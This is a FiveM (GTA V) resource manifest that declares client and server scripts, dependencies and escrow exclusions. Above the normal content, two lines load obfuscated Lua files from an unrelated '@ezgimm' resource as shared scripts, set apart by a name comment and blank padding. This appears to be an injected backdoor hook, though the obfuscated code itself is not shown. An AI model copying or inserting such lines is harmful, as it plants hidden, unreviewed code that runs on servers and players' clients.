shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 
fx_version 'cerulean'
game 'gta5'

lua54 'yes'

dependencies {
    'PolyZone',
    'tgiann-core',
}

escrow_ignore {
    "configs/*.lua",
    "server/editable.lua",
    "client/editable.lua",
    "languages/*.lua",
}

client_scripts {
    "@PolyZone/client.lua",
    "configs/*.lua",
    "languages/*.lua",
    "client/*.lua",
}

server_scripts {
    "configs/*.lua",
    "server/*.lua",
}

dependency '/assetpacks'